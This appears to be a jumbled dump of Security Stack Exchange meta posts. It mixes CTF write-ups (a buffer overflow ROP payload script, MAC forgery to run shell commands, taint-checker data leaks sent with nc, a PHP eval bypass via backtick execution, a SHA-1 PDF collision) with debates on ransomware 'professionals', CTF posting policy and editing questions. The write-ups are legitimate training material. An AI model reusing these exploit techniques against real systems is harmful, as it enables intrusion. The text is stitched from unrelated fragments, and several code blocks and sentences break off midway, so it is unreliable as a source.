<p><a href=""https://i.stack.imgur.com/NUXY0.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/NUXY0.png"" alt=""doBattle disas""></a></p>

<p>The function prints some text, then reads a max of 50 characters. A weird thing to notice is that it performs a check for the value at offset 42 from the read characters and compares it with <code>0x08048595</code>. This corresponds to the end of the <code>doBattle()</code> function:</p>

<pre><code>0x08048595      leave
0x08048596      ret
</code></pre>

<p>After playing with the binary with gdb, it becomes clear that the <code>doBattle()</code> function suffers from a buffer overflow vulnerability. The offset to overwrite <code>EIP</code> is 42. There was a problem however when using the vanilla ""payload testing"" method: <code>A * 42 + BBBB</code>.</p>

<p>The check mentioned previously will basically let us fail since <code>BBBB</code> translates to <code>0x42424242</code> which is bigger than <code>0x08048595</code>, so I changed the payload to <code>A * 42 + \x01 * 4</code>:</p>

<p><a href=""https://i.stack.imgur.com/Ub8AQ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Ub8AQ.png"" alt=""testing the payload""></a></p>

<p>After stepping a bit, it seems we're on the right path:</p>

<p><a href=""https://i.stack.imgur.com/5t9Mb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/5t9Mb.png"" alt=""right offset""></a></p>

<p>Now we need to jump to <code>slayTheBeast()</code> function, however this function resides at address <code>0x080485db</code>. The previously mentioned check will prevent us from jumping to it directly since the address to jump to needs to be smaller than <code>0x08048595</code>. Let's search for some <a href=""https://en.wikipedia.org/wiki/Return-oriented_programming"" rel=""nofollow noreferrer"">ROP gadgets</a> using <a href=""https://github.com/longld/peda"" rel=""nofollow noreferrer"">peda</a>:</p>

<pre><code>gdb-peda$ ropgadget
ret = 0x804835a
popret = 0x8048371
pop2ret = 0x804868a
pop4ret = 0x8048688
pop3ret = 0x8048689
addesp_12 = 0x804836e
addesp_16 = 0x8048465
</code></pre>

<p>The <code>ret</code> at <code>0x0804835a</code> will do the job since it's smaller than <code>0x08048595</code> and it will allow us to return/jump to the <code>slayTheBeast()</code> function which will follow right after it. Our final payload will look like this: <code>A * 42 + ret + slayTheBeast</code>. In practice, this simple Python script will do the job:</p>

<pre><code>from struct import pack

payload = 'A' * 42                 # offset
payload += pack('&lt;I', 0x804835a)   # ret gadget to bypass check (addr must be lower than 0x8048595)
payload += pack('&lt;I', 0x080485db)  # slayTheBeast() addr

print payload
</code></pre>

<p>It's important when using <code>cat</code> to keep <code>stdin</code> open with <code>-</code>:</p>

<p>And instantly had an issue with the choice of words:</p>

<p><strong><em>We are professionals</strong> and will help you get your files back.</em></p>

<p>I decided to edit this, replacing <em>professionals</em> with <em>experts</em>. This is due to my understanding that an expert is somebody with extensive knowledge of a certain field. On the other hand, a professional is an expert who has been certified to act <strong>ethically</strong> and professionally in their field. </p>

<p>The subsequent edit was rejected for the following reasons:</p>

<p><em>A professional is someone who gets paid for their work. Therefore ransomware developers are indeed professionals.</em> </p>

<p>This is a valid point and one we can all agree with. However, I would say this definition doesn't go far enough. An extreme example is somebody who deals in the distribution of narcotics. They get paid for their work, but I personally wouldn't regard them as professionals. I believe the same can be said for Ransomware developers and distributors, getting paid through extortion doesn't comply with my definition of a professional who acts ethically. </p>

<p><em>Experts and professionals are two very different terms. Being expert puts a lot more weight to your opinion than being a professional.</em> </p>

<p>What alarmed me here is the contradiction to my understanding, an understanding that was part of securing my BSc in IT Security. As aforementioned, my understanding is a professional is an expert in a certain field with the addition of certification that they act within the accepted practices/procedures within that field. </p>

<p>So I would like to know what our definition of an IT Professional is in the real world. I already know what I have been taught, but due to the contradictions I have received it seems right to clarify this.  </p>

2954,2,2018-04-05T03:18:58.300,0,,"<p>I will explain why the definition is applicable, even though I agree with Anders that it is not relevant. We use the same definition used by any modern English dictionary. There is no infosec-specific meaning to the word. Generally, it can mean one of three things (paraphrasing from online dictionaries):</p>

<ol>
<li><p><strong>Partaking in a particular profession for a living.</strong> This simply relies on the definition of ""profession"". Anyone who has a particular profession for a given subject is a professional in that subject. Example: <em>My job is to write malware. I am a professional malware developer.</em></p></li>
<li><p><strong>Partaking in an activity often engaged in by amateurs.</strong> This definition simply differentiates an amateur from someone with more experience, when many amateurs are often engaged in the field. Example: <em>I enjoy playing golf, but I am not a professional golfer.</em></p></li>
<li><p><strong>A way of behaving that gives off an aura of formality.</strong> This may be where you are getting mixed up. Professional in this context means behaving in a way that is respectable, formal, or ethical. Example: <em>You should show professional behavior to your customers.</em></p></li>
</ol>

<p>The ransomware developer is not discussing his behavior. He is stating a fact about his profession. So what is a profession? It turns out it does not require professional <em>behavior</em>:</p>

<ol>
<li><p><strong>Taking vows for a religious community.</strong> Clearly, this is not the definition being used.</p></li>
<li><p><strong>A calling requiring specialized knowledge, often with involving formal education.</strong> This implies expertise. Formal education is not always required, but it is common. A person is more likely to become a professional neuroscientist by going to Stanford than at home.</p></li>
<li><p><strong>The principal vocation of employment.</strong> This does not imply any level of expertise. A person can be a professional janitor as long as it is their primary means of making money.</p></li>
</ol>

<p>It is likely that this person was implying the second definition of <em>profession</em> in order to appear as an expert. This may or may not be true. Perhaps he is highly experienced in evading AV and has a very good understanding of the psychology of ransomware victims, or maybe he's just a hack who can barely write code that doesn't crash when it's run. This is irrelevant however as the third definition of <em>profession</em> is true. If this is the way he makes money as a living, he <em>is</em> a professional. You can argue that his behavior is not very professional, but not that this is not his profession.</p>

<p>So why is <em>expert</em> not a better term? Expert implies, of course, a certain level of expertise. By changing the term to expert, you are implying that the second definition of <em>profession</em> is correct, and that this person has a deep understanding of the field he is in, which may or may not be true. A professional simply has a job, an expert knows their job like the back of their hand.</p>

2958,1,2018-04-06T15:11:14.843,-1,60,"<p>While I was writing this, it became to clear me, that I'm not even sure if CTF write-ups are off-topic or prohibited on the main site or if there was ever an agreement to post them here on Meta. If it's just the everyday behaviour; I say: let's change it.</p>

<hr>

<p>In the past we had some really fun CTFs with some great write-ups! Unfortunately these write-ups always end up here on Meta and are therefore only viewed by a very small audience.<br>
Each CTF post has between 100 and 500 views. My guess is, that there are seldomly cross-site views.</p>

<p>I wanted to start the following discussion: Let's allow CTF write-ups on the main site and soften the ""how to ask"" restrictions for them.</p>

<p>There are two reasons why I think this is beneficial: </p>

<ol>
<li>Bigger team roster</li>
</ol>

<p>1.1 As of today the CTF team consists of around 5 to 6 active members.<sup>1</sup> Promoting the team on the main site could help with recruiting new members. New members could help with more active participation in CTFs. More active participation leads to visibility for sec.se in a crowd of possible new, interested and interesting users. More CTF participation also means more write-ups.</p>

<ol start=""2"">
<li>Cross-site visibility </li>
</ol>

<p>2.1. Write-ups are <a href=""https://security.meta.stackexchange.com/questions/tagged/ctf?sort=votes&amp;pageSize=15"">interesting</a>. IMO write-ups would be a great resource to have on the main site. All the CTF team members have done some outstanding work so far. Adding reputation as a bonus can help to keep the quality content coming. But not only might a good write-up get some upvotes on the main site, it maybe might also get some cross-site visibilty with becoming a Hot Network Question. A Meta Question on the other hand will never become Hot. </p>

<p>Why do the on-topic restrictions need to be softened? Why not formulate the challenges as questions and answer them yourself?</p>

<p>The challenges that are given in CTFs are very specific and so are their solutions. If the challenges have to be ""bent"" too much to fit into the style of a question the answer to that question would possibly not qualify as a good write-up anymore. That's why I'd like to get a ruling from the mods and community that says: ""CTF write-ups need not comply with on-topic rules.""<br>
Write-ups will probably still comply with ""<a href=""https://security.stackexchange.com/help/on-topic"">What topics can I ask about here?</a>"" in most cases, but probably not with the ""<a href=""https://security.stackexchange.com/help/how-to-ask"">How do I ask a good question?</a>""-guidelines. They will be only relevant to either other players of the same CTFs or CTFs with similar challenges. Also, askers will rarely be ""open minded"", because the question will always get an immediate answer. Although other users might propose other ways to solve the challenge, which might be interesting.</p>

<p>TL;DR: <strong>Let's allow CTF write-ups on the main site and let's not force the typical question/answer format on them.</strong> </p>

<p>Here are some examples of fantastic write-ups: <a href=""https://security.meta.stackexchange.com/questions/1302/def-con-ctf-2013-qualifiers-15-17-june-ended-including-write-ups"">one</a>, <a href=""https://security.meta.stackexchange.com/questions/1332/sigint-ctf-2013-starts-friday-5-july-1600-gmt-ended-including-write-ups"">two</a>, <a href=""https://security.meta.stackexchange.com/questions/2242/sunshine-ctf-2016-12-march-2016-at-16-pm-utc-lasts-28-5-hours"">three</a></p>

<p><sup>A more organized approach per CTF could change participation numbers. As of now participation is maybe announced too late, so that other users can not plan well. We could/should look into that too.</sup></p>

<p>In my opinion, write-ups aren't good questions, so we shouldn't post them on the main site. You can't easily turn them into good questions since the problem will be way too specific.</p>

<p>I don't think their place is on meta neither, but nobody uses the CTF announcement posts, so I guess posting them as answer there is fine.</p>

<p>However, while playing CTFs, we are confronted to specific challenges we need to solve. These challenges often involve interesting tricks that we research.</p>

<p>I think some of these specific tricks can be turned into good questions, suited to the main site, for example:</p>

<p>So should we recommend the deletion of the post as at the time of review it was genuinely low quality or should we just skip it and let there be a chance that someone else will see it later and hopefully the author would have made a decision?</p>

<p>I would hope that there are no disputes (seems like that's just a template message for undeletion), since the arguments in the comments are gone, and took place so long ago.

2975,2,2018-05-06T16:14:27.753,5,,"<h2>macsh (crypto, 125)</h2>

<p>This defines a custom MAC <code>fmac</code> as follows, given a message <code>m</code>, a key <code>k1</code> and a stream <code>S0</code>:</p>

<ul>
<li>Append the length of <code>m</code> formatted as 16 bytes in big-endian order.</li>
<li>Append <em>b</em> = 1–16 copies of the byte <em>b</em> to pad the message to a multiple of 16 bytes.</li>
<li>Xor the padded message with <code>S0</code>.</li>
<li>Encrypt the result with AES-ECB with the key <code>k1</code>.</li>
<li>Xor all the resulting 16-byte blocks.</li>
</ul>

<p>The stream <code>S0</code> is derived from a 128-bit key <code>k0</code> by repeating a sequence of 128 128-bit blocks where block number <code>i</code> is calculated by rotating <code>k0</code> right by <code>i</code> bits.</p>

<p>The MAC function operates by blocks. We don't know how each encrypted block is calculated, but we know that the result depends only on the content of that block in the message and on the block's index modulo 128. In particular, if a block is repeated at a 128*16=2048-byte interval, then the encrypted blocks will be identical. Since the MAC is a xor of all the encrypted blocks, these repeated blocks cancel out.</p>

<p>We can also deduce the MAC of a message with xor equations. Suppose that <code>m1</code> contains some block <code>B1</code> at position <code>i</code>, and <code>m2</code> is the same message except that position <code>i</code> contains <code>B2</code>. Then <code>fmac(m1) xor fmac(m2)</code> depends only on <code>B1</code>, <code>B2</code> and <code>i</code> modulo 128, and not on the rest of the message.</p>

<p>This MAC function is used in a remote shell where we can use the following commands:</p>

<ul>
<li><code>tag tag</code> or <code>tag echo</code>: calculate the <code>fmac</code> of the command line consisting of <code>tag</code> or <code>echo</code> and the given parameters, joined with a single space.</li>
<li><code>pwd</code>, <code>cd</code>, <code>ls</code>, <code>cat</code>: the usual Unix commands, which require a valid <code>fmac</code>. <code>pwd</code> takes no parameters, the others take exactly one parameter.</li>
</ul>

<p>Null bytes are accepted in arguments but not in file names. Whitespace (spaces and bytes 0x09–0x0d) cannot appear in parameters.</p>

<p>Example: to list the current directory, we can run the command <code>ls .</code>, which is padded to the two blocks <code>ls .000000000000</code>, <code>0004CCCCCCCCCCCC</code> where <code>0</code>, <code>4</code> and <code>C</code> are the characters 0x00, 0x04 and 0x0c respectively. To calculate its MAC, we need to craft a message starting with <code>tag</code> and a space (or <code>echo</code> and a space), containing blocks that will cancel out, and containing the two blocks of the <code>ls</code> command at positions 128 and 129 (or 256 and 257, etc.).</p>

<p>Since we can't pass bytes 0x09–0x0d in parameters, we need to fiddle with the length of the command to avoid those bytes both in the encoding of the length and in the padding. The following command lengths are admissible: 0–2, 8, 14–18, 24–31, 33, 34, 40–50, 56–66,  etc. We can always make a command (other than <code>pwd</code>) longer by adding more slashes in a file name (or prepending <code>./</code> if it doesn't contain a slash). For example, instead of <code>ls .</code>, we can use <code>ls .////</code>.</p>

<p>Given a command <code>cmd</code> of admissible length that is less than 2032 bytes, we want the MAC of <code>cmd</code> at position 0. Query the tags of the following messages:</p>

<ul>
<li><code>tag AAA…</code> where <code>AAA…</code> has the same length as <code>cmd</code>.</li>
<li><code>tag BBB…B</code> of length 2048 bytes, then <code>cmd</code> followed by its length padding.</li>
<li><code>tag BBB…B</code> of length 2048 bytes, then <code>tag AAA…</code> followed by its length padding (which is the same as <code>cmd</code>'s).</li>
</ul>

<p>The xor of these three tags is the tag of <code>cmd</code>.</p>

<p>The following program takes a command line as argument, calculates its MAC by sending <code>tag</code> commands as described above, and finally runs the command.</p>

<pre><code>#!/usr/bin/env python3
import os, re, subprocess, sys
import pexpect
from pexpect import popen_spawn

from fmac import to_blocks, fmac

<p>(Arminius solved it first. I built a slightly different solution as a warm-up to Doggo.)</p>

<p>The server runs an interpreter for a toy language. The language is similar a subset of ML, restricted to expressions involving only the types <code>int</code> and <code>bool</code>, with various syntactic restrictions and only a few predefined operators. You can only execute a single expression per session. You can define functions, but not recursive ones, and there are no loops either.</p>

<p>In addition to ML features, the language has a taint mechanism. Every expression has a secrecy level in addition to its type: public or private. The <code>flag</code> variable is private. The interpreter only prints the value of public expressions. Generally speaking, if an expression involves any private value, its result is private.</p>

<p>The flaw in this interpreter is a classic one: the secrecy of an if-then-else expression depends only on the type of the return expressions, and not on the type of the condition. This allows leaking data one bit at a time.</p>

<p>The flag is encoded as an integer by taking the string's binary representation. We know from <code>run.sml</code> that the flag length is 36 bytes.</p>

<p>The following function takes an argument of the form 2^k and returns 2^k if the flag has bit k set and 0 otherwise.</p>

<pre><code>fn (b : int) =&gt; if flag / b % 2 = 1 then b else 0
</code></pre>

<p>We should be able to get the flag by calling this function 36*8 times and summing up the result.</p>

<pre><code>python -c 'print(""let t = fn (b : int) =&gt; if flag / b % 2 = 1 then b else 0 in t "" + "" + t "".join([str(1 &lt;&lt; i) for i in range(8*6)]))' | nc wolf.chal.pwning.xxx 6808
</code></pre>

<p>However this times out. We need to be more clever. Let's avoid divisions by starting from the highest bit and subtracting in sequence. To make the expression shorter, we use references to keep the current value. This still doesn't work though.</p>

<pre><code>python -c 'print(""let secret = ref flag in let leaked = ref 0 in let t = fn (b : int) =&gt; if !secret &lt; b then () else (secret := !secret - b; leaked := !leaked + b) in t "" + ""; t "".join(reversed([str(1 &lt;&lt; i) for i in range(8*36)])) + ""; !leaked"")' | nc wolf.chal.pwning.xxx 6808
Out of memory with fixed heap size 16,777,216
</code></pre>

<p>I didn't find a way to get the whole flag in a single connection. I settled for extracting one byte at a time.</p>

<pre><code>#!/usr/bin/env python3
import os, re, subprocess, sys

<h2>Doggo (misc, 150)</h2>

<p>This is Pupper with the if flaw fixed.</p>

<p>This doesn't mean that the taint checker is sound, though. As a rule, it's hard to do anything fancy with types when you have both side effects and functions. So let's look for a flaw around those lines.</p>

<p>The taint checker now requires that an if statement with a private condition has branches of private type. Furthermore it analyzes the content of if branches to verify that they don't modify public references. So you can't leak data just by putting <code>leaked := 1 :&gt; private unit</code> in a branch.</p>

<p>But the public reference checker doesn't analyze functions. So all we need to do to hide the leak is to put it inside a function that happens to have a private type. This flaw will remain as long as the type of an assignment is a bare <code>unit</code> regardless of the secrecy of the values involved, or as long as you can hide any assignment behind a semicolon.</p>

<p>Here's the byte extractor script with a modified expression to extract bits:</p>

<pre><code>#!/usr/bin/env python3
import os, re, subprocess, sys

def get_byte(cmd, k):
    expr = '''
    let secret = ref (flag / {} % 256) in
    let leaked = ref 0 in
    let ignore = (fn (bit : int) =&gt; () :&gt; private unit) :&gt; private (int -&gt; private unit) in
    let incr = (fn (bit : int) =&gt; (secret := !secret - bit; leaked := !leaked + bit) :&gt; private unit) :&gt; private (int -&gt; private unit) in
    let test = fn (bit : int) =&gt; (
        (if !secret &lt; bit then ignore else incr) bit
    ) in
    test 128; test 64; test 32; test 16; test 8; test 4; test 2; test 1;
    !leaked'''.format(1 &lt;&lt; (k * 8))
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    output = p.communicate(input=expr.encode('ascii'))[0].decode('ascii')
    if p.returncode != 0:
        print('Error with the expression\n{}'.format(expr))
        print(output)
        exit(1)
    return(int(output.split()[0]))

def get_flag(cmd):
    values = [get_byte(sys.argv[1:], k) for k in range(36)]
    return bytes(reversed(values)).decode('ascii')

<h2>Not solved: Woofer (pwnable, 450)</h2>

<p>I'd thought of exploiting a side channel for Pupper and then Doggo and Woofer, but the calculations are very well protected against timing side channels. The bignum calculations are made with <a href=""https://security.stackexchange.com/users/655/thomas-pornin"">Thomas Pornin</a>'s <a href=""https://github.com/pornin/CTTK"" rel=""nofollow noreferrer"">CTTK</a>, so calculations on the flag won't reveal its magnitude. The code executes both branches of an <code>if</code>, so you can't extract a boolean that way.</p>

<p>What I missed is that the program uses hash consing to keep memory consumption down, presumably because the execution of nested branches may generate a lot of data. (I do wonder if this is a genuine concern given the time limits, or just a gimmick to make Woofer solvable.) Hash consing means that whether two branches are executing on the same data is observable through memory consumption. Memory consumption is mostly not observable memory, but it is if the server dies due to heap exhaustion. Therefore, if you carefully tune your expression's memory consumption, <code>f secret_boolean; f (true :&gt; private bool); ()</code> will either crash or not depending on whether <code>secret_boolean</code> is true. I found the solution in <a href=""https://ctftime.org/writeup/9980"" rel=""nofollow noreferrer"">Plaid Parliament of Pwning's writeup</a>.</p>

<p>You're presented with a website that lets you <code>eval()</code> PHP code. However, the site is protected by a <a href=""http://c67f8ffd.quals2018.oooverflow.io/websec_eval_wl.so"" rel=""nofollow noreferrer"">custom PHP extension</a> that's supposed to restrict <code>eval()</code>, and an <a href=""http://php.net/manual/en/ini.core.php#ini.open-basedir"" rel=""nofollow noreferrer""><code>open_basedir()</code></a> directive.</p>

<p>This means we can't just use...</p>

<pre><code>echo file_get_contents(""/var/www/flag"");
</code></pre>

<p>...because <code>open_basedir()</code> is restricting PHP's access to the <code>/var/www/html</code> directory tree, thus preventing us from reading files at <code>/var/www/</code> directly:</p>

<pre><code>Warning: file_get_contents(): open_basedir restriction in effect. File(/var/www/flag) is not within the allowed path(s): (/var/www/html/) in /var/www/html/index.php(44) : eval()'d code on line 1

Warning: file_get_contents(/var/www/flag): failed to open stream: Operation not permitted in /var/www/html/index.php(44) : eval()'d code on line 1
</code></pre>

<p>Also, the extension seems to prevent us from using functions like <code>shell_exec()</code>. However, we can just take advantage of the <a href=""http://php.net/manual/en/language.operators.execution.php"" rel=""nofollow noreferrer"">backtick execution operator</a>:</p>

<pre><code>echo `/var/www/flag`;
</code></pre>

<p>This immediately works because <code>open_basedir()</code> doesn't extend to shell commands -- which is why I initially used this construct which turned out to be unnecessarily complicated:</p>

<pre><code>echo `sh -c ""/var/www/flag""`;

<p>You're presented with <a href=""http://5a7f02d0.quals2018.oooverflow.io/"" rel=""nofollow noreferrer"">a website</a> which lets you upload PDF documents and provides two services:</p>

<ul>
<li><p>You can get your uploaded PDF document signed. If the text displayed inside the PDF (it's parsed with OCR) starts with <code>ECHO</code>, it's safe to be signed and you will be given a signature.</p></li>
<li><p>You can get your uploaded PDF executed. If you provide a valid signature for your PDF and its displayed text starts with <code>EXECUTE</code>, the command that follows will be <code>shell_exec()</code>'d.</p></li>
</ul>

<p>So the challenge is to obtain a signature for an innocent-looking PDF (must start with <code>ECHO</code>) but also be able to craft a PDF with the same signature that starts with <code>EXECUTE</code>.</p>

<p>Luckily, the PHP app is using   <a href=""http://php.net/manual/en/function.openssl-sign.php"" rel=""nofollow noreferrer""><code>openssl_sign()</code></a> / <a href=""http://php.net/manual/en/function.openssl-verify.php"" rel=""nofollow noreferrer""><code>openssl_verify()</code></a> which defaults to SHA-1 as <code>signature_alg</code> -- and SHA-1 is well-known to be <a href=""https://shattered.io/"" rel=""nofollow noreferrer"">broken in practice</a>. </p>

<p>Google's collision proof of concept takes advantage of diffferently aligned comment sections inside a JPEG embedded into the PDF document to make both PDFs display different images (which can be freely chosen) <a href=""https://security.stackexchange.com/a/152482/95381"">as explained here</a>. (SHA-1 operates on blocks, so you can append arbitrarily large identical blocks to both PDFs after the collision blocks and always end up with the hashes of both documents colliding.)</p>

<p>... so some processing of the UA seems to take place.</p>

<p>In order to narrow down what UA the admin may be using, let's have a look at the distinct features the redirecting page is using:</p>

<ul>
<li><p><code>Content-Security-Policy: upgrade-insecure-requests</code></p></li>

<p>So, we're left with brute-forcing user-agents of Firefox between 42 and 49 with a simple Python script:</p>

<pre><code>import requests

<p>So the flag must be hidden in the site's code or in a header or something. I finally found it using my browser's development tools. Clicking the button to see the challenge text sends a JSON response which is:</p>

  <p><code>{""success"": true, ""message"": ""Stop overthinking it, you already know the answer here.\n\n[comment]: &lt;&gt; (OOO{Sometimes, the answer is just staring you in the face.

<p>The missing letters (and final punctuation) are <code>nwltisoos.</code> This isn't the flag, with or without punctuation.</p>

2987,2,2018-05-16T15:46:30.517,2,,"<p>Personally, I would say the ""best"" way of handling this would be to edit the question and remove the section that is off-topic, leave a comment to say you've edited this as well as an edit summary of course just so the OP knows what's happened and then answer if possible.</p>

<p>I would say context is an amazing thing in these scenarios also, for example in the case of <a href=""https://security.stackexchange.com/questions/148098/cisco-epc3008-vs-cisco-epc3208-has-either-of-them-had-security-issues"">CISCO EPC3008 vs CISCO EPC3208 = has either of them had security issues?</a> his question was on-topic however he also asked an off-topic question, I would argue that because his original question was on-topic but his additional question is off-topic that removing the off-topic question is far better than closing the question altogether.</p>

<p>Whilst we shouldn't encourage poor questions - if the OP has asked something which is on-topic but then added an additional off-topic question he has still asked a valid question. Why should we remove a post when we have the ability to edit in this case? It's salvageable by editing so why would we just outright remove it? </p>

<p>I feel that if we just delete a question because of the addition being off-topic then we're just deleting because we can, rather than deleting because it's a poor question. </p>

2988,2,2018-05-16T16:50:03.750,5,,"<p>Setting aside the current example, here is my general approach:</p>

<ul>
<li>If the on topic parts it the major thing, and the off topic part is more of a side issue, I would comment and ask the OP to remove the off topic part. If I was feeling brave (or if the question is old, with no OP around), I might go right ahead and edit, leaving a comment explaining to OP what I did and why.</li>
<li>If it's the reverse - something mostly off topic with a little bit of on topic stacked on top, I would vote to close and comment recommending OP to refocus to keep the question open.</li>
</ul>

<p>So the approach depends on the context. But the end goal is the same - if there is something good in there, try to separate it from the bad and keep it.</p>

<p>First, we don't really want a list of canonical questions, too hard to maintain as mentioned in previous meta-post <a href=""https://security.meta.stackexchange.com/questions/1673/should-we-work-harder-to-create-canonical-questions"">here</a> and <a href=""https://security.meta.stackexchange.com/questions/1593/would-it-make-sense-to-have-a-curated-list-of-canonical-questions"">here</a>.</p>

<p>Second, <a href=""https://stackoverflow.com/help/tagging"">tags are meant</a> to regroup question about a particular topic. 'canonical questions' are not a security topic, at best it is a meta-topic. </p>

<p>I am therefore strongly opposed to this.</p>

<p>Nevertheless, I'd support the creation of a meta question on 'how to  write/answer a canonical question'. This should include information like, when should we write a CQ, what should be included in my CQ (info banner for example, references, related meta-post).</p>

<p>A post on Stack Exchange can embed images. Those images can be hosted on any website. Images are normally not malicious, but this could be a vector for exploits of browser bugs. Today bugs involving JavaScript are much more likely than bugs involving image parsing. Users cannot put custom JavaScript in their posts on most Stack Exchange sites. A few sites (not Security.SE) support <a href=""https://meta.stackexchange.com/tags/stack-snippets/info"">Stack Snippets</a> which allows posts to contain custom JavaScript code. Obviously this code is sandboxed so it shouldn't be harmful barring bugs.</p>

<p>Do note that Stack Exchange posts can embed images that are hosted on external servers. This doesn't make them potentially <em>malicious</em>, but it can be a breach of privacy. If you view a post that embeds an image that is hosted on a third-party server, then the administrator of that server will know that your IP address viewed that image on that date.</p>
